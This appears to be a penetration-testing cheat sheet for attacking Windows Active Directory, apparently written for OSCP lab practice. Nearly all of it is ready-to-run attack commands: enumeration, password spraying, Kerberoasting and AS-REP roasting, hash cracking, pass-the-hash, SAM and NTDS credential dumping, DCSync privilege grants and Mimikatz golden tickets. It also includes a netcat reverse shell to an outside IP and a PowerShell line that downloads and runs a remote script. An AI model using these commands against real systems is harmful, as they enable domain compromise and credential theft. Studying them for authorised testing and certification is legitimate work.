Url :Active Directory for OSCP
https://whimsical.com/active-directory-YJFeAhW9GMtmLX4SWxKCCM (Follow
Mind map for nodes)

# Enumeration
```
- net user
- net user /domain
- net user <username> /domain
- net group /domain
```
# PowerView Enumeration
```
<# Get-NetLoggedOn
This function will execute the NetWkstaUserEnum Win32API call to query a given host for actively logged on users.
#>

- Get-NetComputer | Get-NetLoggedon
  
<# Get-NetUser
Return all users or specific user objects in AD
To only return specific properties, use "-Properties samaccountname,usnchanged,...". By default, all user objects for
the current domain are returned.
#>

- Get-NetUser -UserName student107
  
<# Get-NetComputer
Return all computers or specific computer objects in AD.
To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all computer objects
for
the current domain are returned.
#>

- Get-NetComputer
- Get-NetComputer -Unconstrained

<# Get-DomainShare
Searches for computer shares on the domain. If -CheckShareAccess is passed, then only shares the current user has read access to are returned.
#>

- Find-DomainShare -CheckShareAccess -Domain svcorp.com -DomainController 10.11.1.20

<# Get-DomainOU
Search for all organization units (OUs) or specific OU objects in AD.
#>

Get-DomainOU -Properties Name | sort -Property Name

<# Get Kerberoastable SPNs
#>
Get-NetUser -SPN | select serviceprincipalname

Request-SPNTicket -SPN "MSSQLSvc/DC.access.offsec" -Format Hashcat

<#Get the count of all the Domain Admins in the domain
#>

Get-NetGroup -AdminCount | select name,memberof,admincount,member | fl
```

# Initial Access

## SMB Shares
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──( 32
7Fkali kali)-[~]
└─$ smbmap -R '\' -H 10.10.10.100 -P 445
	smbmap -R '\' -H 10.10.10.161 -P 445 -u svc-alfresco -p s3rvice
	smbmap -d active.htb -u svc_tgs -p <pass> -H <ip>
	proxychains smbclient \\\\172.16.240.83\\Windows -U 'medtech.com\joe'
	
┌──( 32
7Fkali kali)-[~]
└─$ sudo smbmap -R
'Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups' -H 10.10.10.100 --download
'Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\
\Preferences\Groups\Groups.xml'
crackmapexec smb <ip> -u <user> -p <pass>--shares
# Reading shares with authenticated User and Pass.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# LDAP Search
## Finding Usernames
```
ldapsearch x -h ldap://<IP> -s base
ldapsearch -x -h <ip> -s base namingcontexts
ldapsearch -x -h <ip> -b 'DC = , DC = ' -s sub
```

## Get User List
```
- crackmapexec smb <ip> -u '' -p '' --users #powerfull
- nmap --script smb-enum* -p445 10.10.10.161 (More user might show up in cme)
- ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local"
'(objectClass=user)' sAMAccountName
- rpcclient -U '' 10.10.10.161 #powerfull
- queryusergroups <RID>
- querygroup <Group RID>
- queryuser <RID>
- GetADUsers.py -all active.htb/svc_tgs -dc-ip <ip>
# Need Password
```

# Scan Network
```
proxychains crackmapexec smb <IP_range>
└─$ proxychains nmap -sT -
p80,443,135,139,445,21,53,22,23,389,636,3268,3269,25,5985,5986,3389,88,111,161,1433,110 172.16.224.83 -Pn
```

# Low Hanging Fruit

## Group Policy in SYSVOL
1. Group Policy Preferences is a collection of Group Policy client-side
extensions that deliver preference settings to domain-joined computers
running Microsoft Windows desktop and server operating systems.
2. These policies allowed them to set local accounts, and embed credentials for
various purposes that may otherwise require an embedded password in a
script. So when a new Group Policy Preference (GPP) is generated, a xml file
(generally Groups.xml) with the configuration data, including any passwords
associated with the GPP, is created in the SYSVOL share which are folders on
domain controllers accessible and readable to all authenticated domain users.
3. The cpassword stored in XML file looks like:
```
└─$ cat Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml...
D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description=""cpassword="edBSHOwhZLTjt/
QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1"
...
gpp-decrypt <hash>
```

# Null Login

```
crackmapexec smb <ip> --shares -u '' -p ''
smbmap -H <ip> -u '' -p ''
smbmap -H <ip> -u ''
rpcclient <ip> -U ''
-> enumdomusers
```

# We have User Name but no Password

## ASREP Roast
```
ls /usr/share/doc/python3-impacket/examples
python3 GetNPUsers.py htb.local/ -usersfile user.txt -format hashcat -
outputfile hashes.domain.txt
```

## Password Spray
```
# Put finding password in password.txt
crackmapexec smb <IP> -u users.txt -p password.txt
proxychains crackmapexec smb 172.16.224.82 -u <each user in the domain> -H
hash.txt OR -P <Password>
#Dump PAssword Policy
crackmapexec smb --pass-pol 10.10.10.169
└─$ proxychains crackmapexec smb ips.txt -u yoshi -p Mushroom!
```

# Valid Credentials

## Kerberoasting
```
First Find SPN of the kerberoastable user (Powerview script)
- impacket-GetUserSPNs -request -dc-ip <dc-ip> <full domain>/<user>:<password>
  
- impacket-GetUserSPNs -no-preauth "<asrep_user>" -usersfile "<userlist.txt>" -dc-host "<dc_ip>" "<domain>"/
  
- Rubeus.exe kerberoast
  
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local

# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user

.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins
# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://
raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")

Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```

# CrackHash
```
#Kerberos 5 TGS etype 23
hashcat -m 13100 -a 0 hash rockyou.txt

#Kerberos asrep 23
hashcat -m 18200 hash rockyou.txt

#NTLM (mimikatz sam dump, sekurlsa::logonpasswords)
hashcat -m 1000 hash <wordlist>
```

# Runas (Invoke-RunasCs)
Get that token authorization on windows so we can run bloodhound.
```
runas /netonly /user:active.htb\svc_tgs cmd
```
RunasCs/Invoke-RunasCs.ps1 at master · antonioCoco/RunasCs · GitHub
```
Invoke-RunasCs svc_mssql trustno1 "cmd /c C:\xampp\htdocs\uploads\nc.exe -e cmd.exe 192.168.45.227 53"

WORKS EVERYWHERE
```

# BloodHound
```
Location /opt/BloodHound-linux-x64/resources/app/Collectors
sudo neo4j console
sudo ./BloodHound --no-sandbox
# On victim machine
Import-Module ./SharpHound.ps1
invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-
alfresco -ldappass s3rvice
.\sharp.exe -c all -d <domain>
```

# Lateral Movement

## Interactive Shell
```
impacket-psexec <domain>/<user>:<password>@<ip>
impacket-wmiexec -hashes <hash> htb.local/administrator@<ip>
```

## RDP
```
xfreerdp3 /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution
```
to share a local folder as a share
```
xfreerdp3 /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
```

## Win-RM

```
# Port 5985 - open
evil-winrm -i <ip> -u <user> -p <password>
```

## Pseudo-Shell
```
- atexec.py <domain>/<user>:<password>@<ip> "command"
- smbexec.py <domain>/<user>:<password>@<ip>
- psexec.py <domain>/<user>:<password>@<ip>
- wmiexec.py <domain>/<user>:<password>@<ip>
- dcomexec.py <domain>/<user>:<password>@<ip>
- crackmapexec smb <ip_range> -u <user> -d <domain>
- crackmapexec smb <ip_range> -u <user> -d <domain> -local-auth
#For psexec write ADMIN$ writeable shares in the machine with powerview scripts
```

# Pass-The-Hash [psexec, impacket, CME]
## Pass-The-Hash [psexec, impacket, CME]
```
- crackmapexec smb 192.168.154.171 -u 'ted' -d 'exam.com' -H ':
31aa99ebd6ea4b6d07051acfd48efa35' --shares

- impacket-psexec -hashes ":d098fa8675acd7d26ab86eb2581233e5" exam.com/zensvc@192.168.154.170
  
# Try without DOMAIN NAME ALSO
- impacket-psexec -hashes ":d098fa8675acd7d26ab86eb2581233e5"
zensvc@192.168.154.170

- evil-winrm -i 192.168.154.170 -u zensvc -H d098fa8675acd7d26ab86eb2581233e5
```

## Credential SAM dumping
```
reg save hklm\sam C:\temp\SAM
reg save hklm\system C:\temp\SYSTEM
secretsdump.py -sam SAM -system SYSTEM LOCAL
┌──( 32
7Falien world)-[~/PWK2023/oscpb/192.168.224.147]
└─$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:
31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:
31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:
504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:
4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:
1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:
9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:
92903f280e5c5f3cab018bd91b94c771:::
[*] Cleaning up...
```
__Dumping Credentials – SAM File Hashes - Juggernaut-Sec__

# Permission Move

## DC Sync
Port 49667, 445, 135 is used for DC Sync attack
Enumeration (PowerView)
Permission needed for DCSync
1. Replicating Directory Changes (DS-Replication-Get-Changes)
2. Replicating Directory Changes All (DS-Replication-Get-Changes-All)
3. Replicating Directory Changes In Filtered Set (DS-Replication-Get-Changes-
In-Filtered-Set) (this one isn’t always needed but we can add it just in case)
Find-InterestingDomainAcl -ResolveGUIDs | ?
{$_.IdentityReferenceName -eq 'leon'}
One-Liner that will transfer our owned user to “Exchange Windows
Permissions” and we become part of the DCSync and WriteDacl
permissions and then fetch hash with secretsdump.py
```
# Toss up PowerView before running the One-Liner that will give us the DCSync
rights.
Add-DomainGroupMember -Identity 'Domain Admins' -Members wario; $username = "medtech.com\\wario"; $password = "Mushroom!"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename
System.Management.Automation.PSCredential -argumentlist $username, $secstr;
Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'wario' -
TargetIdentity 'medtech.com\\Domain Admins' -Rights DCSync

# Check if user got added to the group with GenericAll Permission
net group "Exchange Windows Permissions"
secretsdump.py svc-alfresco:s3rvice@<ip>

# Passing the hash
wmiexec.py -hashes <hash> htb.local/administrator@<ip>
Reference:
HTB: Forest | 0xdf hacks stuff
```

## Mimikatz
```
- privilege::debug
- sekurlsa::logonpasswords
- sekurlsa::tickets
- sekurlsa::tickets /export
- lsadump::sam
- kerberos::purge
- kerberos::list
#RC4 can be ntlm hash
- kerberos::golden /user:zensvc /domain:exam.com /
sid:S-1-5-21-88558181-3850747640-3669402957 /target:dc02.exam.com /
service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
#overpassthehash
- sekurlsa::pth /user:jeff_admin /domain:corp.com /
ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
```

## NTDS.dir cracking with SYSTEM
```
impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
```